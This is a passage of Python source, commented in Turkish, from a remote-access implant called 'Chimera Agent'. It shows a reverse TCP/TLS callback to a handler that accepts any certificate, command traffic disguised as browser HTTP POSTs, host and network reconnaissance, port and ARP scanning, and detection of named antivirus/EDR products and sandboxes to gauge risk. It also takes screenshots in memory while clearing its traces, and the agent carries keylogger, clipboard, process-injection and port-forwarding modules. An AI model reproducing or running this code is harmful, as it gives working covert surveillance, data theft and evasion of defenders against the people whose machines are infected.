        output += "-" * 35
        return output

    # ── ARP Scan (Layer 2) ──────────────────────────────────────
    def arp_scan(self, cidr: str) -> str:
        """ARP tablosunu okuyarak yerel ağdaki cihazları listeler.

        Önce broadcast ping ile ARP tablosunun dolmasını sağlar,
        sonra 'arp -a' çıktısını parse eder.
        """
        # Ağı uyandır
        try:
            if sys.platform != "win32":
                parts = cidr.split("/") if "/" in cidr else [cidr, "24"]
                octets = parts[0].split(".")
                broadcast = f"{octets[0]}.{octets[1]}.{octets[2]}.255"
                subprocess.run(
                    ["ping", "-c", "1", "-W", "1", "-b", broadcast],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3,
                )
            else:
                ips = self._cidr_to_ips(cidr)
                for ip in ips[:20]:
                    try:
                        subprocess.run(
                            ["ping", "-n", "1", "-w", "200", ip],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2,
                        )
                    except Exception:
                        pass
        except Exception:
            pass

        # ARP tablosunu oku
        try:
            startupinfo = None
            if sys.platform == "win32":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0

            result = subprocess.run(
                ["arp", "-a"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                startupinfo=startupinfo, timeout=10,
            )

            try:
                arp_output = result.stdout.decode("cp1254") if sys.platform == "win32" else result.stdout.decode("utf-8")
            except Exception:
                arp_output = result.stdout.decode("utf-8", errors="ignore")

            if not arp_output.strip():
                return "[-] ARP tablosu boş veya okunamadı."

            entries = []
            for line in arp_output.strip().split("\n"):
                line = line.strip()
                if not line:
                    continue

                ip = None
                mac = None

                if sys.platform == "win32":
                    parts = line.split()
                    if len(parts) >= 2:
                        candidate = parts[0]
                        if candidate.count(".") == 3:
                            try:
                                list(map(int, candidate.split(".")))
                                ip = candidate
                                mac = parts[1]
                            except ValueError:
                                pass
                else:
                    if "(" in line and ")" in line:
                        try:
                            ip = line.split("(")[1].split(")")[0]
                            if " at " in line:
                                mac = line.split(" at ")[1].split()[0]
                            else:
                                mac = "??"
                        except (IndexError, ValueError):
                            pass

                if ip and mac and mac.lower() not in ("(incomplete)", "<incomplete>", "ff:ff:ff:ff:ff:ff"):
                    entries.append((ip, mac))

            if not entries:
                return "[-] ARP tablosunda geçerli giriş bulunamadı."

            entries.sort(key=lambda x: list(map(int, x[0].split("."))))
            output = f"[+] ARP Scan: {len(entries)} cihaz bulundu\n"
            output += f"{'#':>4s}  {'IP Adresi':<16s}  {'MAC Adresi':<20s}\n"
            output += "-" * 44 + "\n"
            for i, (ip, mac) in enumerate(entries, 1):
                output += f"{i:4d}  {ip:<16s}  {mac:<20s}\n"
            output += "-" * 44
            return output

        except subprocess.TimeoutExpired:
            return "[!] ARP tablosu okuma zaman aşımı."
        except Exception as e:
            return f"[!] ARP scan hatası: {str(e)}"

    # ── Port Scan (TCP Connect) ─────────────────────────────────
    def port_scan(self, host: str, port_range: str = "1-1024",
                  timeout: float = 0.5, max_threads: int = 200) -> str:
        """Hedef host üzerinde TCP port taraması yapar.

        Sadece açık portları raporlar. Servis ismi tahmini yapmaz.

        Args:
            host       : Hedef IP/hostname
            port_range : Port aralığı string (örn: '1-1024', '22,80,443', '1-65535')
            timeout    : Bağlantı timeout (saniye)
            max_threads: Eş zamanlı thread sayısı

        Returns:
            str: Açık portların listesi
        """
        ports = self._parse_ports(port_range)
        if not ports:
            return "[!] Geçersiz port aralığı."

        open_ports = []
        lock = threading.Lock()

        def _scan(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                result = s.connect_ex((host, port))
                s.close()
                if result == 0:
                    with lock:
                        open_ports.append(port)
            except Exception:
                pass

        threads = []
        for port in ports:
            while len([t for t in threads if t.is_alive()]) >= max_threads:
                time.sleep(0.01)
            t = threading.Thread(target=_scan, args=(port,), daemon=True)
            t.start()
            threads.append(t)

        for t in threads:
            t.join(timeout=timeout + 3)

        if not open_ports:
            return f"[-] Port Scan: {host} → Açık port yok ({len(ports)} port tarandı)."

        open_ports.sort()
        output = f"[+] Port Scan: {host} — {len(open_ports)} açık port ({len(ports)} tarandı)\n"
        output += "-" * 30 + "\n"
        for port in open_ports:
            output += f"  {port}/tcp  açık\n"
        output += "-" * 30
        return output


class ChimeraAgent:

    """Chimera Core Agent - Temel reverse TCP ajanı."""

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sock = None
        self.running = True
        self.loaded_modules = {}  # Yüklü modülleri saklar: {name: module_obj}
        self.keylogger      = Keylogger()          # Keylogger modülü
        self.clipboard      = ClipboardManager()    # Clipboard modülü
        self.injector       = ProcessInjector()     # Process Injection modülü
        self.port_forwarder = PortForwarder()       # Port Forwarding modülü
        self.net_scanner    = NetworkScanner()      # Network Scanner modülü

    # --------------------------------------------------------
    # Bağlantı Yönetimi
    # --------------------------------------------------------
    def connect(self) -> bool:
        """Handler'a reverse TCP bağlantısı kurar.
        
        Returns:
            bool: Bağlantı başarılı ise True.
        """
        try:
            # TCP Socket oluştur
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(30)
            
            # SSL Context oluştur
            # Self-signed sertifikaları kabul et
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # SSL Socket'i sarmala
            self.sock = context.wrap_socket(raw_sock, server_hostname=self.host)
            
            # Bağlan
            self.sock.connect((self.host, self.port))
            self.sock.settimeout(None)
            
            return True
        except Exception:
            self.sock = None
            return False

    def reconnect(self) -> bool:
        """Bağlantı koptuğunda yeniden bağlanmayı dener.
        
        Returns:
            bool: Yeniden bağlantı başarılı ise True.
        """
        self.close_socket()
        attempts = 0
        while self.running:
            attempts += 1
            if MAX_RECONNECT != -1 and attempts > MAX_RECONNECT:
                return False
            
            time.sleep(RECONNECT_DELAY)
            
            if self.connect():
                self.send_sysinfo()
                return True
        return False

    def close_socket(self):
        """Mevcut soketi güvenli şekilde kapatır."""
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    # --------------------------------------------------------
    # Protokol: Length-Prefixed Data Transfer
    # Format: [4 byte big-endian uzunluk][UTF-8 data]
    # --------------------------------------------------------
    # --------------------------------------------------------
    # Protokol: HTTP over TLS
    # --------------------------------------------------------
    def send_data(self, data: str):
        """Veriyi HTTP POST request olarak gönderir (Obfuscation)."""
        if not self.sock:
            return
        try:
            encoded_body = data.encode("utf-8")
            
            # Rastgele bir Boundary veya User-Agent üretilebilir
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            
            # HTTP Request Oluştur
            # POST /api/submit HTTP/1.1
            request = (
                b"POST /api/v1/sync HTTP/1.1\r\n"
                b"Host: " + self.host.encode() + b"\r\n"
                b"User-Agent: " + user_agent.encode() + b"\r\n"
                b"Content-Type: application/x-www-form-urlencoded\r\n"
                b"Content-Length: " + str(len(encoded_body)).encode() + b"\r\n"
                b"Connection: keep-alive\r\n"
                b"\r\n"
            )
            
            self.sock.sendall(request + encoded_body)
        except Exception:
            pass

    def recv_data(self) -> str:
        """HTTP Response içinden veriyi okur."""
        if not self.sock:
            return ""
        try:
            # Headerları oku (\r\n\r\n bulana kadar)
            header_buffer = b""
            while b"\r\n\r\n" not in header_buffer:
                chunk = self.sock.recv(1)
                if not chunk: return ""
                header_buffer += chunk
            
            # Content-Length bul
            headers = header_buffer.decode('utf-8', errors='ignore')
            content_length = 0
            for line in headers.split('\r\n'):
                if line.lower().startswith('content-length:'):
                    try:
                        content_length = int(line.split(':')[1].strip())
                    except:
                        pass
            
            # Body'yi oku (Payload)
            body = b""
            while len(body) < content_length:
                chunk = self.sock.recv(content_length - len(body))
                if not chunk: break
                body += chunk
                
            return body.decode("utf-8")
            
        except Exception:
            return ""

    def _recv_exact(self, n: int) -> bytes:
        """Tam olarak n byte veri okur.
        
        Args:
            n: Okunacak byte sayısı.
            
        Returns:
            bytes: Okunan veri veya None.
        """
        data = b""
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    # --------------------------------------------------------
    # Sistem Bilgisi
    # --------------------------------------------------------
    def send_sysinfo(self):
        """Sistem bilgisini toplayıp handler'a gönderir."""
        try:
            uname = platform.uname()
            
            # Kullanıcı adı
            try:
                username = os.getlogin()
            except Exception:
                username = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
            
            # Sistem bilgisi formatı
            info_parts = [
                f"OS: {uname.system} {uname.release}",
                f"Hostname: {uname.node}",
                f"User: {username}",
                f"PID: {os.getpid()}",
                f"Arch: {uname.machine}",
                f"Python: {platform.python_version()}"
            ]
            info = " | ".join(info_parts)
            self.send_data(info)
        except Exception:
            self.send_data("Chimera Agent Connected")

    def get_detailed_sysinfo(self) -> str:
        """Detaylı sistem bilgisi toplar ve formatlanmış string olarak döner.
        
        Returns:
            str: Formatlanmış sistem bilgileri
        """
        output = []
        output.append("=" * 60)
        output.append("DETAYLI SİSTEM BİLGİSİ")
        output.append("=" * 60)
        
        try:
            # 1. Temel Sistem Bilgileri
            uname = platform.uname()
            output.append("\n[+] İşletim Sistemi:")
            output.append(f"    Sistem       : {uname.system}")
            output.append(f"    Sürüm        : {uname.release}")
            output.append(f"    Platform     : {uname.version}")
            output.append(f"    Mimari       : {uname.machine}")
            output.append(f"    Hostname     : {uname.node}")
            
            # 2. Kullanıcı Bilgileri
            try:
                username = os.getlogin()
            except Exception:
                username = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
            
            output.append("\n[+] Kullanıcı Bilgileri:")
            output.append(f"    Kullanıcı    : {username}")
            output.append(f"    Python       : {platform.python_version()}")
            output.append(f"    PID          : {os.getpid()}")
            output.append(f"    Çalışma Dizini: {os.getcwd()}")
            
            # 3. Yetki Seviyesi
            output.append("\n[+] Yetki Seviyesi:")
            if sys.platform == "win32":
                try:
                    import ctypes
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    output.append(f"    Administrator: {'Evet' if is_admin else 'Hayır'}")
                except Exception:
                    output.append(f"    Administrator: Tespit Edilemedi")
            else:
                # Unix/Linux sistemler
                is_root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
                output.append(f"    Root/Sudo    : {'Evet' if is_root else 'Hayır'}")
                try:
                    output.append(f"    UID          : {os.getuid()}")
                    output.append(f"    GID          : {os.getgid()}")
                except Exception:
                    pass
            
            # 4. IP Adresleri
            output.append("\n[+] Ağ Bilgileri (IP Adresleri):")
            ip_list = self._get_ip_addresses()
            if ip_list:
                for ip_info in ip_list:
                    output.append(f"    {ip_info}")
            else:
                output.append("    IP adresi bulunamadı")
            
            # 5. Çalışan Process Listesi (İlk 30 process)
            output.append("\n[+] Çalışan Process'ler (İlk 30):")
            processes = self._get_running_processes()
            if processes:
                output.append(f"    {'PID':<8} {'İsim':<30}")
                output.append(f"    {'-'*8} {'-'*30}")
                for proc in processes[:30]:
                    output.append(f"    {proc}")
            else:
                output.append("    Process listesi alınamadı")
            
        except Exception as e:
            output.append(f"\n[!] Hata: {str(e)}")
        
        output.append("\n" + "=" * 60)
        return "\n".join(output)
    
    def _get_ip_addresses(self) -> list:
        """Sistemdeki tüm IP adreslerini toplar.
        
        Returns:
            list: IP adresi bilgileri
        """
        ip_list = []
        try:
            if sys.platform == "win32":
                # Windows için ipconfig çıktısı parse et
                result = subprocess.check_output("ipconfig", shell=True, stderr=subprocess.DEVNULL)
                output = result.decode('cp1254', errors='ignore')
                
                import re
                ipv4_pattern = r"IPv4.*?: ([\d\.]+)"
                ipv6_pattern = r"IPv6.*?: ([a-fA-F0-9:]+)"
                
                ipv4_matches = re.findall(ipv4_pattern, output)
                ipv6_matches = re.findall(ipv6_pattern, output)
                
                for ip in ipv4_matches:
                    ip_list.append(f"IPv4: {ip}")
                for ip in ipv6_matches:
                    ip_list.append(f"IPv6: {ip}")
            else:
                # Linux/MacOS için ifconfig veya ip addr
                try:
                    result = subprocess.check_output("ip addr show", shell=True, stderr=subprocess.DEVNULL)
                    output = result.decode('utf-8')
                except Exception:
                    try:
                        result = subprocess.check_output("ifconfig", shell=True, stderr=subprocess.DEVNULL)
                        output = result.decode('utf-8')
                    except Exception:
                        return ip_list
                
                import re
                ipv4_pattern = r"inet (?:addr:)?([\d\.]+)"
                ipv6_pattern = r"inet6 (?:addr:)?([a-fA-F0-9:]+)"
                
                ipv4_matches = re.findall(ipv4_pattern, output)
                ipv6_matches = re.findall(ipv6_pattern, output)
                
                for ip in ipv4_matches:
                    if ip != "127.0.0.1":  # Loopback'i atla
                        ip_list.append(f"IPv4: {ip}")
                for ip in ipv6_matches:
                    if not ip.startswith("::1"):  # Loopback'i atla
                        ip_list.append(f"IPv6: {ip}")
        except Exception:
            pass
        
        return ip_list if ip_list else ["IP adresi tespit edilemedi"]
    
    def _get_running_processes(self) -> list:
        """Çalışan process listesini toplar.
        
        Returns:
            list: Process bilgileri (PID ve isim)
        """
        processes = []
        try:
            if sys.platform == "win32":
                # Windows için tasklist
                result = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL)
                output = result.decode('cp1254', errors='ignore')
                
                lines = output.split('\n')[3:]  # Header'ı atla
                for line in lines:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 2:
                            name = parts[0]
                            pid = parts[1]
                            processes.append(f"{pid:<8} {name:<30}")
            else:
                # Linux/MacOS için ps
                result = subprocess.check_output("ps aux", shell=True, stderr=subprocess.DEVNULL)
                output = result.decode('utf-8', errors='ignore')
                
                lines = output.split('\n')[1:]  # Header'ı atla
                for line in lines:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 11:
                            pid = parts[1]
                            # Komut adını al (son kısım)
                            name = parts[10]
                            processes.append(f"{pid:<8} {name:<30}")
        except Exception:
            pass
        
        return processes

    def detect_security_products(self) -> dict:
        """Sistemdeki antivirüs ve EDR ürünlerini tespit eder.
        
        Returns:
            dict: Tespit edilen güvenlik ürünleri ve detayları
        """
        result = {
            "detected": [],
            "suspicious_processes": [],
            "total_av_processes": 0
        }
        
        # Bilinen AV/EDR process isimleri (küçük harf)
        known_security_products = {
            # Antivirüs
            "avp.exe": "Kaspersky Anti-Virus",
            "avgui.exe": "AVG Antivirus",
            "avguard.exe": "Avira",
            "bdagent.exe": "Bitdefender",
            "msmpeng.exe": "Windows Defender",
            "msseces.exe": "Microsoft Security Essentials",
            "wrsa.exe": "Webroot SecureAnywhere",
            "savservice.exe": "Sophos Antivirus",
            "mcshield.exe": "McAfee",
            "egui.exe": "ESET",
            "ekrn.exe": "ESET",
            "ashdisp.exe": "Avast",
            "avastsvc.exe": "Avast",
            "avastui.exe": "Avast",
            "avgnt.exe": "Avira",
            "nortonsecurity.exe": "Norton Security",
            "ccsvchst.exe": "Norton/Symantec",
            "mbam.exe": "Malwarebytes",
            "mbamservice.exe": "Malwarebytes",
            "tmbmsrv.exe": "Trend Micro",
            "pccntmon.exe": "Trend Micro",
            
            # EDR (Endpoint Detection and Response)
            "csfalconservice.exe": "CrowdStrike Falcon",
            "csagent.exe": "CrowdStrike",
            "csfalconcontainer.exe": "CrowdStrike Falcon",
            "mssense.exe": "Microsoft Defender for Endpoint",
            "senseir.exe": "Microsoft Defender for Endpoint",
            "sentinelagent.exe": "SentinelOne",
            "sentinelservicehost.exe": "SentinelOne",
            "sentineld.exe": "SentinelOne",
            "carbonblack.exe": "Carbon Black",
            "cb.exe": "Carbon Black",
            "cylance": "Cylance",
            "mcafee": "McAfee Endpoint",
            "fireeye": "FireEye",
            "tanium": "Tanium",
            "qualys": "Qualys",
            "elastic": "Elastic EDR",
            "osquery": "osquery",
            "wazuh": "Wazuh",
            
            # Linux/MacOS AV
            "clamav": "ClamAV",
            "sophos": "Sophos",
            "eset_daemon": "ESET",
            "avast": "Avast"
        }
        
        try:
            # Process listesini al
            processes = self._get_running_processes()
            
            for proc_line in processes:
                proc_name = proc_line.split()[1].lower() if len(proc_line.split()) > 1 else ""
                
                # Bilinen ürünlerle karşılaştır
                for known_proc, product_name in known_security_products.items():
                    if known_proc in proc_name:
                        if product_name not in result["detected"]:
                            result["detected"].append(product_name)
                            result["suspicious_processes"].append(proc_line.strip())
                            result["total_av_processes"] += 1
                        break
                
                # Genel güvenlik yazılımı kalıpları
                security_keywords = ["antivirus", "antimalware", "defender", "security", 
                                   "edr", "xdr", "firewall", "threat", "protection"]
                if any(keyword in proc_name for keyword in security_keywords):
                    if proc_line.strip() not in result["suspicious_processes"]:
                        result["suspicious_processes"].append(proc_line.strip())
                        
        except Exception:
            pass
        
        return result
    
    def detect_virtualization(self) -> dict:
        """Sanal makine veya sandbox ortamını tespit eder.
        
        Returns:
            dict: Sanallaştırma tespit sonuçları
        """
        result = {
            "is_virtualized": False,
            "vm_indicators": [],
            "confidence": "low"  # low, medium, high
        }
        
        indicators_found = 0
        
        try:
            # 1. DMI/SMBIOS kontrolü (Windows/Linux)
            if sys.platform == "win32":
                # Windows: WMIC ile kontrol
                try:
                    output = subprocess.check_output(
                        "wmic computersystem get manufacturer,model",
                        shell=True,
                        stderr=subprocess.DEVNULL
                    ).decode('cp1254', errors='ignore').lower()
                    
                    vm_vendors = {
                        "vmware": "VMware",
                        "virtualbox": "VirtualBox",
                        "kvm": "KVM",
                        "qemu": "QEMU",
                        "xen": "Xen",
                        "microsoft": "Hyper-V",
                        "parallels": "Parallels",
                        "virtual": "Generic VM"
                    }
                    
                    for vendor, name in vm_vendors.items():
                        if vendor in output:
                            result["vm_indicators"].append(f"Manufacturer: {name}")
                            indicators_found += 1
                except Exception:
                    pass
                
                # BIOS Version kontrolü
                try:
                    output = subprocess.check_output(
                        "wmic bios get version",
                        shell=True,
                        stderr=subprocess.DEVNULL
                    ).decode('cp1254', errors='ignore').lower()
                    
                    if any(vm in output for vm in ["vbox", "vmware", "qemu", "virtual"]):
                        result["vm_indicators"].append("BIOS: Virtual BIOS detected")
                        indicators_found += 1
                except Exception:
                    pass
                    
            else:
                # Linux/MacOS: dmidecode veya system_profiler
                try:
                    if platform.system() == "Linux":
                        output = subprocess.check_output(
                            "sudo dmidecode -s system-manufacturer",
                            shell=True,
                            stderr=subprocess.DEVNULL,
                            timeout=2
                        ).decode('utf-8', errors='ignore').lower()
                        
                        if any(vm in output for vm in ["vmware", "virtualbox", "qemu", "kvm", "xen"]):
                            result["vm_indicators"].append(f"DMI: {output.strip()}")
                            indicators_found += 1
                    elif platform.system() == "Darwin":
                        # MacOS - VM detection
                        output = subprocess.check_output(
                            "ioreg -l | grep -i 'manufacturer'",
                            shell=True,
                            stderr=subprocess.DEVNULL
                        ).decode('utf-8', errors='ignore').lower()
                        
                        if any(vm in output for vm in ["vmware", "parallels", "virtualbox"]):
                            result["vm_indicators"].append("IORegistry: VM detected")
                            indicators_found += 1
                except Exception:
                    pass
            
            # 2. MAC Address kontrolü (VM'ler belirli prefix'ler kullanır)
            try:
                if sys.platform == "win32":
                    output = subprocess.check_output(
                        "getmac",
                        shell=True,
                        stderr=subprocess.DEVNULL
                    ).decode('cp1254', errors='ignore').upper()
                else:
                    output = subprocess.check_output(
                        "ifconfig -a",
                        shell=True,
                        stderr=subprocess.DEVNULL
                    ).decode('utf-8', errors='ignore').upper()
                
                vm_mac_prefixes = [
                    "00:05:69",  # VMware
                    "00:0C:29",  # VMware
                    "00:1C:14",  # VMware
                    "00:50:56",  # VMware
                    "08:00:27",  # VirtualBox
                    "00:16:3E",  # Xen
                    "00:1C:42",  # Parallels
                ]
                
                for prefix in vm_mac_prefixes:
                    if prefix in output:
                        result["vm_indicators"].append(f"MAC Address: VM prefix detected ({prefix})")
                        indicators_found += 1
                        break
            except Exception:
                pass
            
            # 3. CPU Count (Sandbox'lar genelde düşük CPU kullanır)
            try:
                import multiprocessing
                cpu_count = multiprocessing.cpu_count()
                if cpu_count <= 2:
                    result["vm_indicators"].append(f"Low CPU count: {cpu_count} cores (suspicious)")
                    indicators_found += 0.5  # Yarım puan (her zaman VM değil)
            except Exception:
                pass
            
            # 4. Disk boyutu (Sandbox'lar genelde küçük disk kullanır)
            try:
                total_disk = shutil.disk_usage('/').total / (1024**3)  # GB
                if total_disk < 60:
                    result["vm_indicators"].append(f"Small disk: {total_disk:.1f}GB (suspicious)")
                    indicators_found += 0.5
            except Exception:
                pass
                
            # 5. Windows: Registry kontrolü (VM araçları)
            if sys.platform == "win32":
                try:
                    # VMware Tools registry key
                    output = subprocess.check_output(
                        'reg query "HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools"',
                        shell=True,
                        stderr=subprocess.DEVNULL
                    )
                    result["vm_indicators"].append("Registry: VMware Tools installed")
                    indicators_found += 2  # Kesin kanıt
                except Exception:
                    pass
            
            # Güven seviyesini belirle
            if indicators_found >= 3:
                result["is_virtualized"] = True
                result["confidence"] = "high"
            elif indicators_found >= 1.5:
                result["is_virtualized"] = True
                result["confidence"] = "medium"
            elif indicators_found >= 0.5:
                result["confidence"] = "low"
                
        except Exception:
            pass
        
        return result
    
    def detect_environment(self) -> str:
        """Ortam analizi yapar - AV/EDR ve VM tespiti.
        
        Returns:
            str: Formatlanmış ortam analizi raporu
        """
        output = []
        output.append("=" * 60)
        output.append("ORTAM ANALİZİ RAPORU")
        output.append("=" * 60)
        
        # 1. Güvenlik Ürünleri Tespiti
        output.append("\n[+] Antivirüs/EDR Taraması:")
        av_result = self.detect_security_products()
        
        if av_result["detected"]:
            output.append(f"    ⚠️  {len(av_result['detected'])} güvenlik ürünü tespit edildi:")
            for product in av_result["detected"]:
                output.append(f"       • {product}")
        else:
            output.append("    ✓  Bilinen güvenlik ürünü tespit edilmedi")
        
        if av_result["suspicious_processes"]:
            output.append(f"\n    Şüpheli Process'ler ({len(av_result['suspicious_processes'])}):")
            for proc in av_result["suspicious_processes"][:10]:  # İlk 10'u göster
                output.append(f"       - {proc}")
        
        # 2. Sanallaştırma Tespiti
        output.append("\n[+] Sanallaştırma/Sandbox Kontrolü:")
        vm_result = self.detect_virtualization()
        
        if vm_result["is_virtualized"]:
            confidence_emoji = "🔴" if vm_result["confidence"] == "high" else "🟡"
            output.append(f"    {confidence_emoji} Sanal ortam tespit edildi (Güven: {vm_result['confidence'].upper()})")
            
            if vm_result["vm_indicators"]:
                output.append(f"    Göstergeler:")
                for indicator in vm_result["vm_indicators"]:
                    output.append(f"       • {indicator}")
        else:
            output.append("    ✓  Fiziksel makine olarak görünüyor")
            if vm_result["vm_indicators"]:
                output.append(f"    Not: Bazı VM göstergeleri bulundu ama kesin değil:")
                for indicator in vm_result["vm_indicators"]:
                    output.append(f"       • {indicator}")
        
        # 3. Genel Risk Değerlendirmesi
        output.append("\n[+] Risk Değerlendirmesi:")
        risk_score = 0
        
        if len(av_result["detected"]) > 0:
            risk_score += 3
        if len(av_result["detected"]) >= 2:
            risk_score += 2
        if vm_result["is_virtualized"] and vm_result["confidence"] == "high":
            risk_score += 3
        elif vm_result["is_virtualized"]:
            risk_score += 1
        
        if risk_score >= 5:
            risk_level = "🔴 YÜKSEK - Güvenlik kontrollü ortam"
        elif risk_score >= 3:
            risk_level = "🟡 ORTA - Dikkatli hareket edin"
        else:
            risk_level = "🟢 DÜŞÜK - Normal ortam"
        
        output.append(f"    {risk_level}")
        output.append(f"    Risk Skoru: {risk_score}/10")
        
        output.append("\n" + "=" * 60)
        return "\n".join(output)

    # --------------------------------------------------------
    # Ekran Görüntüsü (Screenshot) - RAM üzerinden capture
    # --------------------------------------------------------
    def take_screenshot(self) -> str:
        """Anlık ekran görüntüsü alıp base64 encoded olarak döner.
        
        Tüm işlem RAM üzerinde gerçekleşir, diske herhangi bir dosya yazılmaz.
        Platform bağımsız çalışır: Windows, Linux, macOS.
        
        Returns:
            str: SCREENSHOT_OK:<base64_png_data> veya hata mesajı
        """
        import io
        import tempfile
        
        png_data = None
        
        # Yöntem 1: mss kütüphanesi (cross-platform, en güvenilir)
        try:
            import mss
            with mss.mss() as sct:
                # Tüm monitörleri kapsayan screenshot
                monitor = sct.monitors[0]  # 0 = tüm ekranlar
                screenshot = sct.grab(monitor)
                
                # PNG formatına çevir (RAM üzerinde)
                png_data = mss.tools.to_png(screenshot.rgb, screenshot.size)
            
            b64_data = base64.b64encode(png_data).decode('utf-8')
            return f"SCREENSHOT_OK:{b64_data}"
        except ImportError:
            pass  # mss yüklü değil, diğer yöntemleri dene
        except Exception:
            pass
        
        # Yöntem 2: PIL/Pillow kütüphanesi
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            png_data = buffer.getvalue()
            buffer.close()
            
            b64_data = base64.b64encode(png_data).decode('utf-8')
            return f"SCREENSHOT_OK:{b64_data}"
        except ImportError:
            pass
        except Exception:
            pass
        
        # Yöntem 3: Platform spesifik araçlar (standart kütüphane + OS araçları)
        if sys.platform == "win32":
            # Windows: ctypes ile GDI+ kullanarak ekran görüntüsü
            try:
                import ctypes
                from ctypes import windll, c_int, c_uint, c_void_p, byref, sizeof
                from ctypes.wintypes import DWORD, LONG, WORD, BYTE
                
                # Ekran boyutlarını al
                user32 = windll.user32
                gdi32 = windll.gdi32
                
                width = user32.GetSystemMetrics(0)   # SM_CXSCREEN
                height = user32.GetSystemMetrics(1)   # SM_CYSCREEN
                
                # Device Context oluştur
                hdesktop = user32.GetDesktopWindow()
                hdc = user32.GetWindowDC(hdesktop)
                memdc = gdi32.CreateCompatibleDC(hdc)
                
                # Bitmap oluştur
                hbitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
                gdi32.SelectObject(memdc, hbitmap)
                
                # Ekranı kopyala
                gdi32.BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)  # SRCCOPY
                
                # BITMAPINFOHEADER yapısı (40 byte)
                class BITMAPINFOHEADER(ctypes.Structure):
                    _fields_ = [
                        ('biSize', DWORD),
                        ('biWidth', LONG),
                        ('biHeight', LONG),
                        ('biPlanes', WORD),
                        ('biBitCount', WORD),
                        ('biCompression', DWORD),
                        ('biSizeImage', DWORD),
                        ('biXPelsPerMeter', LONG),
                        ('biYPelsPerMeter', LONG),
                        ('biClrUsed', DWORD),
                        ('biClrImportant', DWORD),
                    ]
                
                bi = BITMAPINFOHEADER()
                bi.biSize = sizeof(BITMAPINFOHEADER)
                bi.biWidth = width
                bi.biHeight = -height  # Top-down
                bi.biPlanes = 1
                bi.biBitCount = 24
                bi.biCompression = 0  # BI_RGB
                bi.biSizeImage = width * height * 3
                
                # Pixel verilerini al
                pixel_data = ctypes.create_string_buffer(bi.biSizeImage)
                gdi32.GetDIBits(memdc, hbitmap, 0, height, pixel_data, byref(bi), 0)
                
                # BMP formatında oluştur (RAM üzerinde)
                bmp_header = struct.pack('<2sIHHI', b'BM',
                    14 + sizeof(BITMAPINFOHEADER) + bi.biSizeImage,
                    0, 0,
                    14 + sizeof(BITMAPINFOHEADER))
                
                # biHeight'ı pozitif yap (BMP formatı için)
                bi.biHeight = height
                bmp_data = bmp_header + bytes(bi) + pixel_data.raw
                
                # Temizlik
                gdi32.DeleteObject(hbitmap)
                gdi32.DeleteDC(memdc)
                user32.ReleaseDC(hdesktop, hdc)
                
                b64_data = base64.b64encode(bmp_data).decode('utf-8')
                return f"SCREENSHOT_OK:{b64_data}"
                
            except Exception as e:
                return f"[!] Screenshot hatası (Windows ctypes): {str(e)}"
                
        elif sys.platform == "darwin":
            # macOS: screencapture komutu (stdout'a yönlendir)
            try:
                # Geçici dosya kullanmadan pipe ile al
                tmp_path = os.path.join(tempfile.gettempdir(), f".sc_{random.randint(100000,999999)}.png")
                result = subprocess.run(
                    ["screencapture", "-x", tmp_path],
                    capture_output=True,
                    timeout=10
                )
                
                if os.path.exists(tmp_path):
                    with open(tmp_path, "rb") as f:
                        png_data = f.read()
                    # Hemen sil (izleri temizle)
                    os.remove(tmp_path)
                    
                    b64_data = base64.b64encode(png_data).decode('utf-8')
                    return f"SCREENSHOT_OK:{b64_data}"
                else:
                    return "[!] Screenshot alınamadı (screencapture başarısız)"
            except Exception as e:
                # Geçici dosyayı temizle
                try:
                    if os.path.exists(tmp_path):
                        os.remove(tmp_path)
                except:
                    pass
                return f"[!] Screenshot hatası (macOS): {str(e)}"
                
        else:
            # Linux: scrot, import (ImageMagick) veya xdg araçları
            tools = [
                ["scrot", "-o", "/dev/stdout"],           # scrot stdout'a
                ["import", "-window", "root", "png:-"],   # ImageMagick
                ["gnome-screenshot", "-f", "/dev/stdout"], # GNOME
            ]
            
            for tool_cmd in tools:
                try:
                    result = subprocess.run(
                        tool_cmd,
                        capture_output=True,
                        timeout=10
                    )
                    if result.returncode == 0 and result.stdout:
                        png_data = result.stdout
                        b64_data = base64.b64encode(png_data).decode('utf-8')
                        return f"SCREENSHOT_OK:{b64_data}"
                except FileNotFoundError:
                    continue  # Bu araç yüklü değil, sonrakini dene
                except Exception:
                    continue
            
            # Hiçbir araç çalışmadıysa geçici dosya yöntemi
            try:
                tmp_path = os.path.join(tempfile.gettempdir(), f".sc_{random.randint(100000,999999)}.png")
                for fallback_cmd in [
                    ["scrot", tmp_path],
                    ["import", "-window", "root", tmp_path],
                ]:
                    try:
                        result = subprocess.run(fallback_cmd, capture_output=True, timeout=10)
                        if os.path.exists(tmp_path):
                            with open(tmp_path, "rb") as f:
                                png_data = f.read()
                            os.remove(tmp_path)
                            b64_data = base64.b64encode(png_data).decode('utf-8')
                            return f"SCREENSHOT_OK:{b64_data}"
                    except FileNotFoundError:
                        continue
                    except Exception:
                        continue
                        
